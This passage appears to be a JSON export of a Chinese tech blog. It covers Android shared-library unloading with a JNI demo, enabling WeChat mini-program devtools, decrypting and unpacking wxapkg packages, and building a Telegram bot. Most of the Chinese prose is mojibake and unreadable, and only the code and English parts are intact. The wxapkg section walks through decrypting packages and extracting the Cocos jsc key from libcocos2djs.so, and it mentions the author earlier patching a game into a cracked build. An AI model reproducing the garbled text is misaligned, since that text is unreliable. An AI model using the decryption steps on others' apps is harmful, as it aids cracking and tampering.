needs_native_bridge = false; char* nativeloader_error_msg = nullptr; // è°ƒç”¨ dlopen æ‰“å¼€ç›®æ ‡ so void* handle = android::OpenNativeLibrary( env, runtime_->GetTargetSdkVersion(), path_str, class_loader, (caller_location.empty() ? nullptr : caller_location.c_str()), library_path.get(), &amp;needs_native_bridge, &amp;nativeloader_error_msg); VLOG(jni) &lt;&lt; \"[Call to dlopen(\\\"\" &lt;&lt; path &lt;&lt; \"\\\", RTLD_NOW) returned \" &lt;&lt; handle &lt;&lt; \"]\"; ...&#125; Below we dlopen but there is no paired dlclose, this would be necessary if we supported class unloading. Libraries will only be unloaded when the reference count (incremented by dlopen) becomes zero from dlclose. å½“è°ƒç”¨ dlopen åŠ è½½ so æ—¶ï¼Œä¼šå¢åŠ ä¸€æ¬¡å¯¹ so çš„å¼•ç”¨è®¡æ•°ï¼Œè€Œå½“å¼•ç”¨è®¡æ•°å˜æˆ 0 ä¹‹åï¼Œä¾¿ä¼šè‡ªåŠ¨è°ƒç”¨ dlclose å¸è½½ so //android-platform\\bionic\\linker\\linker.cppstatic soinfo* find_library(android_namespace_t* ns, const char* name, int rtld_flags, const android_dlextinfo* extinfo, soinfo* needed_by) &#123; soinfo* si = nullptr; ... // åŠ è½½ so æˆåŠŸï¼Œso çš„å¼•ç”¨æ¬¡æ•° + 1, å¯¹åº”äº† JavaVMExt::LoadNativeLibrary ä¸­ //so åŠ è½½æ—¶ è¿™ä¸€éƒ¨åˆ†çš„æ³¨é‡Šâ†“ /* Below we dlopen but there is no paired dlclose, this would be necessary if we supported class unloading. Libraries will only be unloaded when the reference count (incremented by dlopen) becomes zero from dlclose. */ si->increment_ref_count(); return si;&#125;æ‰€ä»¥ç°åœ¨æˆ‘ä»¬çš„ç›®æ ‡ä»è°è°ƒç”¨äº† dlclose å˜æˆäº†è°è°ƒç”¨äº† soinfo::decrement_ref_count , ä½†æ˜¯åœ¨ soinfo_unload ä¸­ï¼Œä¸æ˜¯å·²ç»è°ƒç”¨è¿‡ decrement_ref_count äº†å—ï¼Œè¿™æ®µæ³¨é‡Šå’Œå®é™…çš„æƒ…å†µæ€ä¹ˆçœ‹èµ·æ¥ç›¸äº’çŸ›ç›¾ï¼Ÿæˆ‘ä»¬æœŸæœ›çš„å‡½æ•°è°ƒç”¨æ˜¯ anonymous_func-&gt;decrement_ref_count-&gt;dlclose , ä½†æ˜¯å®é™…çš„è°ƒç”¨æµæ˜¯ dlclose-&gt;decrement_ref_count , è¿™å®Œå…¨æ˜¯ç›¸åçš„è°ƒç”¨è¿‡ç¨‹å‘€ # ç¼–å†™ demo è§‚å¯Ÿå¸è½½å‡½æ•°è°ƒç”¨å…ˆåæƒ…å†µ ç°åœ¨æˆ‘ä»¬å…‰ä»æºç å·²ç»å¾ˆéš¾å†é€†å‘åˆ†æå‡ºæœ€ç»ˆæ˜¯åœ¨å“ªä¸€ä¸ªå‡½æ•°ä¸­ä¾æ¬¡è°ƒç”¨äº† JNI_OnUnload å’Œ call_destructors , æ‰€ä»¥æˆ‘ä»¬éœ€è¦å®é™…åŠ¨æ‰‹å†™ä¸€ä¸ªæµ‹è¯• demo, é€šè¿‡æ‰“å°æ—¥å¿—çš„æ–¹å¼ï¼Œé€šè¿‡ logcat æ¥è§‚å¯Ÿå®é™…çš„è°ƒç”¨æƒ…å†µ #include &lt;jni.h>#include \"stdio.h\"#include &lt;dlfcn.h>extern \"C\"&#123;#include &lt;android/log.h>#define TAG \"oacia_tag\" // è¿™ä¸ªæ˜¯è‡ªå®šä¹‰çš„ LOG çš„æ ‡è¯†#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG,TAG ,__VA_ARGS__)jint JNI_OnLoad(JavaVM* vm, void* reserved __unused)&#123; LOGD(\"JNI_OnLoad called\"); return JNI_VERSION_1_6;&#125;__attribute((constructor)) void before_main()&#123; LOGD(\"constructor called!\");&#125;__attribute((destructor)) void after_main()&#123; LOGD(\"destructor called!\");&#125;void JNI_OnUnload(JavaVM* vm, void* reserved __unused)&#123; LOGD(\"JNI_OnUnload called\");&#125;&#125;ç„¶è€Œå½“é€€å‡º app æ—¶ï¼Œä¸è®º JNI_OnUnload è¿˜æ˜¯ destructor å‡æ²¡æœ‰è¢«è°ƒç”¨ï¼Œèµ°åˆ°è¿™é‡Œçœ‹èµ·æ¥å·²ç»è¿›å…¥æ­»èƒ¡åŒäº†ï¼Œå¯èƒ½è¿™ä¸¤ä¸ªå‡½æ•°ä»æœªè¢«è°ƒç”¨â€¦ é‚£æš‚æ—¶å…ˆåˆ°æ­¤ä¸ºæ­¢å§ï½è¦æ˜¯æœªæ¥æœ‰æ–°çš„å‘ç°çš„è¯å†ç»§ç»­å¸è½½è¿‡ç¨‹çš„åˆ†æ # å‚è€ƒèµ„æ–™ Android Linker å­¦ä¹ ç¬”è®° Android ç³»ç»ŸåŠ è½½ so çš„æºç åˆ†æ Android åŠ¨æ€ä¿®æ”¹ Linker å®ç° LD_PRELOAD å…¨å±€åº“ PLT Hook","categories":[],"tags":[]},{"title":"å¾®ä¿¡å°ç¨‹åºdevtoolæŠ“åŒ…+åç¼–è¯‘wxapkg","slug":"wechat-mini-program-with-devtool","date":"2024-01-30T07:55:11.000Z","updated":"2024-02-01T11:51:00.348Z","comments":true,"path":"wechat-mini-program-with-devtool/","link":"","permalink":"https://oacia.dev/wechat-mini-program-with-devtool/","excerpt":"","text":"ä»Šå¤©é—²æ¥æ— äº‹ï¼Œä¸Šç½‘å†²æµªï¼Œçªç„¶å‘ç°ä¸€ä¸ªä»¤æˆ‘çœ¼å‰ä¸€äº®çš„é¡¹ç›® WeChatOpenDevTools-Python, è¿™è¿™è¿™ï¼Œçœ‹ README çš„ä»‹ç»ï¼Œæˆ‘å²‚ä¸æ˜¯å¯ä»¥åœ¨å°ç¨‹åºé‡Œé¢å¼€ devtool äº†å—ï¼ï¼Ÿ æƒ³æ¥ 2022 å¹´ä¹Ÿæœ‰ä¸ªå°ç¨‹åºç¾Šäº†ä¸ªç¾Šçˆ†ç«é‚£ä¼šå„¿ï¼Œæˆ‘ä¹Ÿå¯¹å°ç¨‹åºé€†å‘åˆ†æç©äº†ç©ï¼Œç„¶ååšäº†ä¸ªç ´è§£ç‰ˆçš„è‡ªå¨±è‡ªä¹äº†ä¸€ä¸‹ (å½“ç„¶ä¹Ÿæ˜¯ç®—æœ‹å‹åœˆæ’åæ»´), å½“æ—¶æ‹¿ UnpackMiniApp.exe è§£å¯†äº† wxapkg æ ¼å¼çš„å°ç¨‹åºï¼Œç„¶åç”¨ wxappUnpacker å¼„å‡ºäº†å°ç¨‹åºçš„ js æºç æ¥ï¼Œå®¡è®¡ä¸€ä¸‹æ‰¾åˆ°ä¿®æ”¹çš„åœ°æ–¹ patch é€»è¾‘åˆ°æœ€å¼€å§‹çš„ wxapkg åŒ…å°±ç ´è§£å¥½äº† è™½ç„¶ä½†æ˜¯ï¼Œé‚£æ—¶æˆ‘å°±åœ¨æƒ³å¾®ä¿¡å°ç¨‹åºæ—¢ç„¶ç”¨çš„æ˜¯æµè§ˆå™¨çš„å†…æ ¸ï¼Œé‚£ä¹ˆå¿…å®šæ˜¯æœ‰æ–¹æ³•å¯ä»¥å¼€å¯å¼€å‘è€…å·¥å…·çš„ï¼Œä¸è¿‡ç”±äºå½“æ—¶åœ¨ç½‘ä¸Šè¿˜æ²¡å‘ç°è¿™æ ·çš„æŠ€æœ¯æ‰€ä»¥ä¹Ÿå°±åªæ˜¯ä¸€ä¸ªæƒ³æ³•äº†ï¼Œç°åœ¨æ­£å·§ç¢°åˆ°äº†å¤§ä½¬å¼€æºäº†èƒ½å¤Ÿå¼€å¯å¾®ä¿¡å°ç¨‹åºçš„é¡¹ç›®ï¼Œäºæ˜¯æˆ‘ä¾¿æƒ³çœ‹çœ‹å°ç¨‹åº + devtool é€†å‘çš„æ„Ÿè§‰ç©¶ç«Ÿæ˜¯å¦‚ä½•çš„å‘¢ï½ ç¢°å·§èº«è¾¹çš„äººåœ¨ç©å’¸é±¼ä¹‹ç‹ (è™½ç„¶æˆ‘æ²¡ç©è¿‡), ä½†æ˜¯å®ƒæ¯•ç«Ÿæ˜¯ä¸€ä¸ªå°ç¨‹åºï¼Œé‚£å°±æ‹¿å®ƒæ¥æµ…æµ…å°è¯•ä¸€ä¸‹ devtool é€†å‘çš„æ„Ÿè§‰æ˜¯æ€ä¹ˆæ ·çš„å’¯ ^.^ è®©å¾®ä¿¡å°ç¨‹åºå¼€å¯ devtool æœ‰è¢«å°å·çš„é£é™©ï¼Œè¯·åŠ¡å¿…ä½¿ç”¨å°å·ç™»å½•ç”µè„‘ç‰ˆå¾®ä¿¡ï¼ï¼ï¼ # å¾®ä¿¡å¼€å¯ devtool ä» github ä¸Šä¸‹è½½é¡¹ç›® git clone https://github.com/JaveleyQAQ/WeChatOpenDevTools-Python.git ä¸‹è½½é¡¹ç›®ä¾èµ– pip install -r requirements.txt éœ€è¦å…ˆæ‰“å¼€ç”µè„‘ç‰ˆå¾®ä¿¡å¹¶ç™»å½• è¿è¡Œ main.py python main.pyéšä¾¿å¼€ä¸€ä¸ªå°ç¨‹åºï¼Œå‡ºç°ä¸‹åˆ—ä¿¡æ¯åˆ™ä»£è¡¨ devtool å¼€å¯æˆåŠŸ ç‚¹ä¸€ä¸‹å°ç¨‹åºå³ä¸Šè§’çš„ä¸‰ä¸ªç‚¹ å°±å¯ä»¥å¼€å¯ devtool å•¦ # åç¼–è¯‘ wxapkg devtool å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´åŠ æ–¹ä¾¿çš„æŠ“åˆ°å°ç¨‹åºçš„åŒ…ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦é€šè¿‡åç¼–è¯‘ wxapkg æ‹¿åˆ°å°ç¨‹åºçš„æºä»£ç ï¼Œå› ä¸ºåœ¨ devtool çš„ source é‡Œé¢ï¼Œå°ç¨‹åºçš„æºç éƒ½è¢«æ•´åˆåˆ°äº†ä¸€ä¸ª js é‡Œé¢å¾ˆéš¾çœ‹å‡ºä»£ç çš„å±‚æ¬¡ç»“æ„ # æå– wxapkg Windows é»˜è®¤å°ç¨‹åºçš„å­˜æ”¾è·¯å¾„ä¸º C:\\Users\\&#123;ç³»ç»Ÿç”¨æˆ·å&#125;\\Documents\\WeChat Files\\Applet\\&#123;å°ç¨‹åºçš„AppID&#125;\\ # è§£å¯† wxapkg ä½¿ç”¨ pc_wxapkg_decrypt_python æ¥è§£å¯† wxapkg python .\\main.py --wxid wx0840558555a454ed --file .\\__APP__.wxapkg --output dec.wxapkg # è§£åŒ… wxapkg ä½¿ç”¨ wxappUnpacker æ¥è§£åŒ… wxapkg ç”±äºå’¸é±¼ä¹‹ç‹å°ç¨‹åºçš„åŒ…æ˜¯æœ‰å­åŒ…çš„ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ - s å‚æ•° .\\bingo.bat .\\dec.wxapkg -s=_subpackages_game_.wxapkgè§£åŒ…æˆåŠŸï½ ç®€å•çœ‹äº†ä¸€ä¸‹æ–‡ä»¶ç»“æ„ï¼Œè¿™æ¸¸æˆçœ‹èµ·æ¥æ˜¯ç”¨ coco2djs å†™çš„ï¼Œè€Œä¸”è¿™ js ä¹Ÿæ²¡æœ‰åŠ å¯†å…¨æ˜¯æºç ï¼Œhmmm å†é€†ä¸‹å»ä¸å°±å˜æˆä»£ç å®¡è®¡äº†å—â€¦ é‚£å°±åˆ°æ­¤ä¸ºæ­¢å’¯ï¼š) # å…¶ä»– å°±è¿™æ ·ç»“æŸä¼¼ä¹æœ‰ç‚¹å¤ªæ½¦è‰äº†ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯æˆ‘åˆ«çš„ä¸€äº›æƒ³æ³• æ—¢ç„¶å’¸é±¼ä¹‹ç‹ç”¨çš„æ˜¯ coco2djs, è€Œåœ¨å®˜ç½‘çš„æè¿°ä¸­ï¼Œcoco2d æ˜¯è·¨å¹³å°çš„ï¼Œé‚£æˆ‘è¦æ˜¯å¼€å‘äººå‘˜ï¼Œè‚¯å®šåœ¨å®‰å“ä¸Šç”¨çš„ä¹Ÿæ˜¯ coco2d æœä¸å…¶ç„¶ï¼Œä¸‹äº†ä¸€ä¸ª apk ç‰ˆçš„å’¸é±¼ä¹‹ç‹è§£åŒ…ä¹‹åï¼ŒçœŸçš„åœ¨é‡Œé¢å‘ç°äº† libcocos2djs.so æœ‰è¶£çš„æ˜¯åœ¨ assets ç›®å½•ä¸‹æœ‰ libjiagu.so , è¿™æ˜æ˜¾æ˜¯å¥—äº†ä¸€ä¸ª 360 åŠ å›ºæƒ³è¦ä¸ºéš¾é€†å‘çš„äººå‘€ ä½† 360 åŠ å›ºçš„æ˜¯ dex, ä½†æ˜¯ coco2d çš„æºç ä¸å…¨æ˜¯ js å†™çš„å˜›ï¼Ÿå”¯ä¸€çš„ä½œç”¨åº”è¯¥å°±æ˜¯é˜²æ­¢é‡æ‰“åŒ…äº†å§ è€Œä¸”è¿™ä¸ªæºä»£ç ç”šè‡³è¿ coco2dx-js å†…ç½®çš„æŠŠæºç åŠ å¯†æˆ jsc çš„åŠŸèƒ½éƒ½æ²¡æœ‰ï¼Œè¿™ä¸‹è¿å¯†é’¥éƒ½ä¸ç”¨æ‰¾äº†â€¦ é‚£é¡ºä¾¿è®°å½•ä¸€ä¸‹åŠ å¯†æˆ jsc ç±»ä¼¼ä¸‹å›¾çš„æ ·å­è¯¥å¦‚ä½•åº”å¯¹å§ å¾ˆç®€å•ï¼Œ 010editor æ‰“å¼€ libcocos2djs.so å…¨å±€æœç´¢ jsb-adapater , å®ƒå‰é¢é‚£ä¸€ä¸²å­—ç¬¦ä¸²å°±æ˜¯ jsc çš„å¯†é’¥ æ‹¿åˆ°äº†å¯†é’¥ï¼Œç”¨ cocoscreatorjscdecrypt å°±å¯ä»¥è§£å¯†å‡ºæºç æ¥äº†","categories":[],"tags":[]},{"title":"telegram bot åˆä½“éªŒåŠäº‘ç«¯éƒ¨ç½²","slug":"telegram-bot-develop","date":"2023-12-31T13:08:18.000Z","updated":"2023-12-31T16:38:35.613Z","comments":true,"path":"telegram-bot-develop/","link":"","permalink":"https://oacia.dev/telegram-bot-develop/","excerpt":"","text":"# å‰è¨€ ä¸ºä»€ä¹ˆçªç„¶æƒ³è¦å»åšä¸€ä¸ª telegram bot äº†å‘¢ï¼Ÿ è¿™å°±è¦è¯´åˆ°å›°æ‰°æˆ‘å¾ˆä¹…çš„ä¸€ä¸ªå°é—®é¢˜äº†ï¼Œæˆ‘åœ¨åˆ·æŠ–éŸ³çš„è¿‡ç¨‹ä¸­ï¼Œçœ‹åˆ°æœ‰æ„æ€çš„è§†é¢‘æˆ–è€…å¥½çœ‹çš„å›¾ç‰‡ï¼Œå°±å¾ˆæƒ³è¦æŠŠå®ƒä»¬ç»™ä¿å­˜ä¸‹æ¥ï¼Œä½œä¸ºå£çº¸æˆ–è€…å’Œåˆ«äººåˆ†äº«ï¼Œä½†æ˜¯æœ‰çš„æ—¶å€™ ä¿å­˜æœ¬åœ° è¿™ä¸ªé€‰é¡¹æ˜¯ç°è‰²çš„ä¸è®©æˆ‘å»ä¿å­˜ è€Œä¸”æŠ–éŸ³åœ¨å›¾ç‰‡ä¿å­˜çš„è¿‡ç¨‹ä¸­æ€»æ˜¯ä¼šæ‰“ä¸Šæ°´å°ï¼Œå°±åƒä¸‹é¢è¿™ä¸ªæ ·å­ï¼Œå€˜è‹¥ç”¨ä½œå£çº¸æˆ–è€…æ—¥å¸¸æ‰“å¼€æ¥çœ‹çš„æ—¶å€™å°±æ„Ÿè§‰ååˆ†çš„â€¦ åˆ«æ‰­ è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘å°±ä¼šæŠŠæŠ–éŸ³çš„è§†é¢‘æˆ–å›¾æ–‡åˆ†äº«é“¾æ¥å¤åˆ¶ä¸‹æ¥ï¼Œæ‰“å¼€å¾®ä¿¡å°ç¨‹åºï¼Œæ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æŠ–éŸ³æ— æ°´å°ä¸‹è½½çš„å°ç¨‹åºï¼Œå¿å—å‡ åç§’å¹¿å‘Šçš„ç…ç†¬ä¹‹åï¼Œç»ˆäºå¯ä»¥æˆåŠŸçš„æŠŠå›¾ç‰‡ä¿å­˜åˆ°æœ¬åœ°ï¼Œå¬èµ·æ¥ç›¸å½“çš„ä¸ä¾¿å§ï¼Œç„¶è€Œæˆ‘å·²ç»è¿›è¡Œä¸Šé¢çš„æ“ä½œä¸çŸ¥å¤šå°‘æ¬¡äº†ï¼Œæ‰€ä»¥äºŸéœ€ä¸€ä¸ªæ›´åŠ æ–¹ä¾¿çš„æ–¹å¼æ¥å¸®åŠ©æˆ‘å‡å°‘æ— æ„ä¹‰æ—¶é—´çš„æ¶ˆè€— è€Œåœ¨æŠ–éŸ³æ”¶è—å¤¹å›¾æ–‡æ‰¹é‡è·å–è¿™ç¯‡ blog ä¸­ï¼Œæˆ‘å·²ç»åˆ©ç”¨ python ä»£ç ä¸‹è½½åˆ°äº†æŠ–éŸ³ä¸Šçš„æ— æ°´å°çš„è§†é¢‘å’Œå›¾ç‰‡ï¼Œé‚£ä¹ˆç°åœ¨è¦åšçš„å°±æ˜¯å¦‚ä½•ä¾¿æ·çš„è¿è¡Œè¿™æ®µ python ä»£ç å¹¶è¿”å›è§†é¢‘æˆ–å›¾ç‰‡ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘æƒ³åˆ°äº† telegram bot , å› ä¸º tg æˆ‘æ—¥å¸¸ä¹Ÿæ˜¯åœ¨ç”¨çš„ï¼Œæ‰“å¼€é€Ÿåº¦å¿«ï¼Œç•Œé¢ç®€æ´éƒ½æ˜¯æˆ‘é€‰æ‹©å®ƒçš„åŸå› ï¼Œè€Œ telegram bot ç®—æ˜¯ telegram çš„ç‰¹è‰²å§ï¼Œä¹‹å‰æ€»æ˜¯è§‰å¾— bot æ˜¯ä¸ªç¥ç§˜çš„å­˜åœ¨ï¼Œä½†æ˜¯è¿™ä¸¤å¤©çš„ bot åšä¸‹æ¥ï¼Œå‘ç°å…¶å®æ˜¯ç›¸å½“çš„ç®€å•çš„ï¼Œé˜…è¯»çº¯è‹±æ–‡æ–‡æ¡£ï¼Œè‡ªæˆ‘æ¢ç´¢çš„è¿‡ç¨‹ä¹ŸåŒæ ·å……æ»¡çš„ä¹è¶£ï¼è€Œä¸”æˆ‘è®¤ä¸ºä¹‹åæˆ‘è¿˜å¯ä»¥å‘è¿™ä¸ª bot ä¸­åŠ å…¥æ›´å¤šçš„æœ‰åˆ›é€ åŠ›çš„ï¼Œæé«˜ç”Ÿæ´»æ•ˆç‡çš„åŠŸèƒ½ï¼Œæ•¬è¯·æœŸå¾…ï½ å¯ä»¥æ¥ç©ç©è¿™ä¸ª bot å™¢ï½https://t.me/oacia_bot bot çš„æºä»£ç å‘å¸ƒåœ¨ github ä¸Šé¢ https://github.com/oacia/oacia_bot # tg bot python åº“é€‰æ‹© æ—¢ç„¶æˆ‘ä»¬é€‰å®šäº†æ ¸å¿ƒä»£ç æ˜¯ç”¨ python ç¼–å†™çš„ï¼Œé‚£ä¹ˆé€‰æ‹©ä¸€ä¸ªç®€å•æ˜“ä¸Šæ‰‹çš„ telegram bot é›†æˆåº“å°±æ˜¾å¾—éå¸¸æœ‰å¿…è¦å•¦ï¼Œä»–ä»¬å°è£…äº† telegram å®˜æ–¹çš„ bot api, æˆ‘ä»¬åªéœ€è¦è°ƒç”¨ python åº“ä½œè€…é›†æˆçš„å‡½æ•°å°±å¯ä»¥æ–¹ä¾¿çš„ä½¿ç”¨ bot api çš„å„ç§åŠŸèƒ½ï¼Œç°åœ¨ä¸»æµçš„ tg bot python åº“åˆ†åˆ«æ˜¯ telethon telebot python-telegram-bot æˆ‘æœ€ç»ˆé€‰æ‹©çš„åº“æ˜¯ telethon, åŸå› å¾ˆç®€å•ï¼Œ å®˜æ–¹æ–‡æ¡£å†™çš„å®åœ¨æ˜¯å¤ªè¯¦ç»†äº†ï¼è€Œ telebot æˆ‘ä¹Ÿå°è¯•äº†ï¼Œç„¶è€Œ API çš„å˜åŒ–å®åœ¨æ˜¯å¤ªå¤§äº†ï¼Œç½‘ä¸Šä½¿ç”¨æ—§ç‰ˆæœ¬çš„ telebot æ‰€å±•ç¤ºçš„ä»£ç å®Œå…¨æ²¡æœ‰å‚è€ƒä»·å€¼ï¼Œpython-telegram-bot ç”¨æ³•å¾ˆå¤æ‚ï¼Œå®˜æ–¹æ–‡æ¡£å†™çš„ä¹Ÿä¸æ˜¯å¾ˆè¯¦ç»†å¯¼è‡´æˆ‘ç”¨èµ·æ¥ç›¸å½“ç—›è‹¦â€¦ # telegram bot ä»€ä¹ˆæ˜¯ telegram bot? è¿™æ˜¯å®˜æ–¹æ–‡æ¡£ä¸­çš„ä»‹ç» Bots are small applications that run entirely within the Telegram app. Users interact with bots through flexible interfaces that can support any kind of task or service. å®ƒå…¶å®æœ¬è´¨ä¸Šæ˜¯åŸºäº Telegram å®¢æˆ·ç«¯çš„ç¬¬ä¸‰æ–¹ç¨‹åºï¼Œæˆ‘ä»¬ç»™æœºå™¨äººå‘é€æ¶ˆæ¯ï¼Œæœºå™¨äººé€šè¿‡ä»£ç å¤„ç†æˆ‘ä»¬å‘é€çš„æ¶ˆæ¯ä¹‹åï¼Œå†å‘é€å›æ¶ˆæ¯ç»™æˆ‘ä»¬ï¼Œç±»ä¼¼äºä¸‹é¢æˆ‘å’Œæˆ‘çš„ bot çš„ç®€å•äº¤äº’ # bot å®ç°ç®€å•çš„äº¤äº’ å¤§å®¶å¯ä»¥çœ‹åˆ°ä¸Šæ–¹æˆ‘ä»¬åˆšåˆšå®ç°äº†ä¸€ä¸ªç®€å•çš„äº¤äº’ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç”¨ telethon æ¥å®ç°ä¸€ä¸‹å§ï½ é¦–å…ˆå®‰è£… telethon pip install telethonä»£ç é•¿è¿™ä¸ªæ ·å­çš„ï¼Œä¸€çœ¼çœ‹ä¸Šå»æ˜¯ä¸æ˜¯å¾ˆç®€å•å‘¢ï½ from telethon import TelegramClient, eventsapi_id = 12345678,api_hash = \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",bot_token: \"1234567890:aaaaaaaaaaaaaaaaa-bbbbbbbbbbbbbbbbbb\",session: \"oacia_bot\",proxy = (\"HTTP\", \"127.0.0.1\", 7890)client = TelegramClient(session, api_id, api_hash, proxy=proxy).start(bot_token=bot_token)@client.on(events.NewMessage(pattern='(.*)'))async def hello(event): user = await client.get_entity(event.peer_id.user_id) await event.reply(\"bot has received your message!\") await client.send_message(user,f\"wow!&#123;user.username&#125;, you say &#123;event.text&#125;\") client.run_until_disconnected()è¿™é‡Œçš„ api_id , api_hash å’Œ bot_token æˆ‘å°†ä¼šä»‹ç»è·å–çš„æ–¹æ³• api_id , api_hash å’Œ bot_token åƒä¸‡ä¸è¦æ³„æ¼ç»™å…¶ä»–äººï¼Œåƒä¸‡ä¸è¦ï¼ï¼ # api_id api_hash é¦–å…ˆå‰å¾€ https://my.telegram.org/, è¾“å…¥æ‰‹æœºå·ï¼Œåœ¨ telegram ä¸Šæ¥æ”¶åˆ° login code åè¿›å…¥ éšåç‚¹å‡»è¿™é‡Œçš„ API development tools å»åˆ›å»ºä¸€ä¸ª app, è¿™é‡Œçš„æ•°æ®éšä¾¿å¡«ä¹Ÿæ˜¯æ²¡é—®é¢˜çš„ï¼Œå¦‚æœç½‘é¡µä¸€ç›´æŠ¥é”™ ERROR , é‚£ä¹ˆç™¾åˆ†ä¹‹ä¹åæ˜¯ä»£ç†çš„é—®é¢˜ï¼Œä¸€ç›´æ¢ä»£ç†ç›´åˆ°æˆåŠŸåˆ›å»º app åœ¨ App configuration çš„ä½ç½®å°±å¯ä»¥å¾—åˆ° api_id å’Œ api_hash # bot_token æƒ³è¦åˆ›å»º telegram bot, æˆ‘ä»¬éœ€è¦å‘é€æ¶ˆæ¯ç»™ botfather, é€šè¿‡ /newbot å‘½ä»¤ï¼Œè¾“å…¥ bot çš„ name å’Œ username ä¹‹åï¼Œæˆ‘ä»¬çš„ bot å°±è¢«åˆ›å»ºå¥½å•¦ï½çº¢æ¡†æ¡†é‡Œé¢çš„ token å°±æ˜¯æˆ‘ä»¬çš„ bot_token ä¹‹åå°†ä¸Šé¢è·å–åˆ°çš„ä¸‰ä¸ªå‚æ•°å¡«å…¥ä»£ç ï¼Œè¿è¡Œ python è„šæœ¬ï¼Œè®¿é—® t.me/[username] , å°±å¯ä»¥å’Œæˆ‘ä»¬åˆ›å»ºçš„æœºå™¨äººäº¤äº’å•¦ # bot äº‘ç«¯éƒ¨ç½² å› ä¸ºæœ¬äººä»æœªæ‹¥æœ‰è¿‡ä¸€å°å±äºè‡ªå·±çš„æœåŠ¡å™¨ (äºŒè¿›åˆ¶æ ¹æœ¬ä¸éœ€è¦æœåŠ¡å™¨æ»´ï¼ğŸ˜„), æ‰€ä»¥å°±å°†ç›®å…‰è½¬å‘äº†ç½‘ä¸Šå…è´¹çš„äº‘æœåŠ¡éƒ¨ç½²ä¸Šï¼Œç»è¿‡ä¸‹é¢é‚£ä¹ˆå¤šäº‘æœåŠ¡çš„å°è¯•ï¼Œæˆ‘æœ€ç»ˆé€‰æ‹©å°†æœåŠ¡éƒ¨ç½²åœ¨ render ä¸Šé¢äº† # google colab ä¸€å¼€å§‹æˆ‘æ˜¯åœ¨ google çš„ colab ä¸Šé¢æ‰§è¡Œ bot ä»£ç çš„ï¼Œç›´æ¥åœ¨ google äº‘ç«¯ç¡¬ç›˜é‡Œé¢åˆ›å»ºä¸€ä¸ª ipynb æ–‡ä»¶å¹¶ç‚¹å‡»å°±å¯ä»¥è¿›å…¥ colab äº†ï¼Œä½†æ˜¯ colab åªèƒ½è¿ç»­è¿è¡Œ 12 ä¸ªå°æ—¶ï¼Œpass # github codespace åæ¥æˆ‘æŠŠ bot ä»£ç æ”¾åˆ° github çš„ codespace é‡Œé¢è¿è¡Œï¼Œæ²¡æƒ³åˆ°åªèƒ½è¿è¡Œå‡ ååˆ†é’Ÿå°±æ–­å¼€äº† qaq # vercel ä¹‹åæˆ‘åˆæƒ³åˆ°äº† vercel, æ¯•ç«Ÿä¹‹å‰å°±æœ‰è¿‡ vercel éƒ¨ç½²é™æ€ç½‘ç«™çš„ç»éªŒï¼Œå¹¶ä¸”å»çœ‹äº† vercel çš„å®˜æ–¹æ–‡æ¡£ï¼Œæ˜¯å¯ä»¥æ”¯æŒ python çš„è¿è¡Œæ—¶çš„ï¼ŒUsing the Python Runtime with Serverless Functions ä½†æ˜¯å®ƒåªèƒ½é€šè¿‡è®¿é—®ç›¸åº”çš„ api è·¯ç”±æ¥è§¦å‘å‡½æ•°çš„æ‰§è¡Œï¼Œè€Œ telethon ä½¿ç”¨çš„æ˜¯ MTProto åè®®ç›´æ¥å’Œ telegram æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œå¹¶ä¸éœ€è¦å¯¹å¤–å¼€æ”¾ä¸€ä¸ªè·¯ç”±ï¼Œè¿™å°±æ„å‘³ç€ telethon åœ¨ vercel ä¸Šå°†æ— æ³•ä½¿ç”¨ MTProto is Telegramâ€™s own protocol to communicate with their API when you connect to their servers. Telethon is an alternative MTProto-based backend written entirely in Python and much easier to setup and use. å› æ­¤æˆ‘åˆå»é˜…è¯»äº† telebot çš„å®˜æ–¹æ–‡æ¡£ï¼Œç…§ç€ Flask-ChatGPT-TelegramBot-Vercel é‡Œé¢çš„ä»£ç é‡æ„äº†åŸæœ¬çš„è„šæœ¬ è¿™é‡Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ telegram çš„ webhook åŠŸèƒ½ ä»€ä¹ˆæ˜¯ webhook? ç®€å•çš„è¯´å°±æ˜¯å°† telegram æœåŠ¡å™¨å‘é€ç»™ bot çš„ message åŒæ—¶ä¹Ÿè½¬å‘åˆ°è®¾å®šçš„ä¸€ä¸ª url ä¸Šï¼Œæ¶ˆæ¯çš„ json æ ¼å¼å¦‚ä¸‹æ–¹æ‰€ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥å¤„ç†è¿™ä¸ªæ¶ˆæ¯å¹¶è¿”å›ç»™å‘é€æ¶ˆæ¯æ–¹ç›¸åº”çš„æ¶ˆæ¯ &#123;ok: true,result: [ &#123; update_id: 11223344, message: &#123; message_id: 2, from: &#123; id: 123456789, is_bot: false, first_name: \"\", username: \"\", language_code: \"en\" &#125;, chat: &#123; id: 123456789, first_name: \"\", username: \"\", type: \"private\" &#125;, date: 1558784616, text: \"My first message to this bot\" &#125; &#125; ]&#125; è®¾ç½® webhook æ–¹æ³•å¾ˆç®€å•ï¼Œæµè§ˆå™¨è®¿é—®è¿™ä¸ªç½‘ç«™å°±å¯ä»¥äº† https://api.telegram.org/bot&#123;$token&#125;/setWebhook?url=&#123;$webhook_url&#125; è¿™æ ·åšäº†ä¹‹åç¡®å®æ˜¯å¯ä»¥è¿›è¡Œç®€å•çš„äº¤äº’çš„ï¼Œä½†æ˜¯å½“æˆ‘è®© bot æ‰§è¡Œä¸‹è½½æŠ–éŸ³å›¾ç‰‡è¿™ç§è€—æ—¶ä»»åŠ¡çš„æ—¶å€™ï¼Œvercel å…è´¹ç‰ˆçš„å¼Šç«¯å°±ä½“ç°å‡ºæ¥äº†ï¼Œ ä¸€ä¸ªå‡½æ•°æœ€é•¿åªèƒ½æ‰§è¡Œ 10 ç§’ï¼Œ10 